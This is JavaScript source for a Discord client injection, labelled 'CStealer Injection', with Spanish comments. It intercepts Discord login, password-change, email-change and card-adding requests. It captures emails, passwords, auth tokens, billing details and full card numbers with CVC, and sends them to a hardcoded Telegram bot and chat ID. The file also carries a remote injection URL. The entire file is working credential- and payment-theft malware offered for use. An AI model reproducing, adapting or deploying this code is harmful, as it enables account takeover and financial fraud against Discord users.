const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

// Datos de configuración del bot de Telegram
const config = {
  telegramBotToken: '6879238985:AAFbEPA9-UeLzjZB9zwRgqEEDdveGNO_APw', // Reemplaza con tu token de bot
  telegramChatId: '1002244787119', // Reemplaza con tu chat ID o canal ID de Telegram
  autoBuyNitro: false,
  pingOnRun: true,
  pingVal: '@everyone',
  embedName: 'CStealer Injection',
  embedIcon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png',
  embedColor: 2895667,
  injectionUrl: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js',
  api: 'https://discord.com/api/v9/users/@me',
};

// Función para enviar mensajes a Telegram
function sendTelegramMessage(botToken, chatId, text) {
  const data = JSON.stringify({
    chat_id: chatId,
    text: text,
    parse_mode: 'Markdown'
  });

  const options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: `/bot${botToken}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length,
    },
  };

  const req = https.request(options, (res) => {
    let responseData = '';
    res.on('data', (chunk) => {
      responseData += chunk;
    });

    res.on('end', () => {
      console.log('Mensaje enviado a Telegram:', responseData);
    });
  });

  req.on('error', (error) => {
    console.error('Error al enviar mensaje a Telegram:', error);
  });

  req.write(data);
  req.end();
}

// Función para obtener la información del usuario de Discord a través del token
const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "https://discord.com/api/v9/users/@me", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

// Función para recuperar la información de facturación del usuario
const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.length || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '💳 ';
          break;
        case 2:
          billing += '<:paypal:951139189389410365> ';
          break;
      }
    }
  });
  if (!billing) billing = '❌';
  return billing;
};

// Función para enviar la información de login a Telegram
const login = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);

  const telegramMessage = `**Account Information:**
  Email: **${email}**
  Password: **${password}**
  
  **Discord Information:**
  Nitro Type: **${nitro}**
  Badges: **${badges}**
  Billing: **${billing}**
  
  **Token:** \`${token}\``;

  // Envía el mensaje a Telegram
  sendTelegramMessage(config.telegramBotToken, config.telegramChatId, telegramMessage);
};

// Función para enviar el cambio de contraseña a Telegram
const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);

  const telegramMessage = `**Password Changed:**
  Email: **${json.email}**
  Old Password: **${oldpassword}**
  New Password: **${newpassword}**
  
  **Discord Information:**
  Nitro Type: **${nitro}**
  Badges: **${badges}**
  Billing: **${billing}**
  
  **Token:** \`${token}\``;

  // Envía el mensaje a Telegram
  sendTelegramMessage(config.telegramBotToken, config.telegramChatId, telegramMessage);
};

// Función para enviar el cambio de correo a Telegram
const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);

  const telegramMessage = `**Email Changed:**
  New Email: **${email}**
  Password: **${password}**
  
  **Discord Information:**
  Nitro Type: **${nitro}**
  Badges: **${badges}**
  Billing: **${billing}**
  
  **Token:** \`${token}\``;

  // Envía el mensaje a Telegram
  sendTelegramMessage(config.telegramBotToken, config.telegramChatId, telegramMessage);
};

// Función para procesar cuando una tarjeta de crédito se añade
const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);

  const telegramMessage = `**Credit Card Added:**
  Credit Card Number: **${number}**
  CVC: **${cvc}**
  Expiration: **${expir_month}/${expir_year}**
  
  **Discord Information:**
  Nitro Type: **${nitro}**
  Badges: **${badges}**
  Billing: **${billing}**
  
  **Token:** \`${token}\``;

  // Envía el mensaje a Telegram
  sendTelegramMessage(config.telegramBotToken, config.telegramChatId, telegramMessage);
};

// Monitoreo de las solicitudes para interceptar el login, cambios de email, contraseña, etc.
session.defaultSession.webRequest.onCompleted({ urls: ['https://discord.com/api/v*/auth/login', 'https://discord.com/api/v*/users/@me'] }, async (details) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;

  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);

  // Ejecutar scripts según el tipo de solicitud
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );

  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsed_data.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    default:
      break;
  }
});
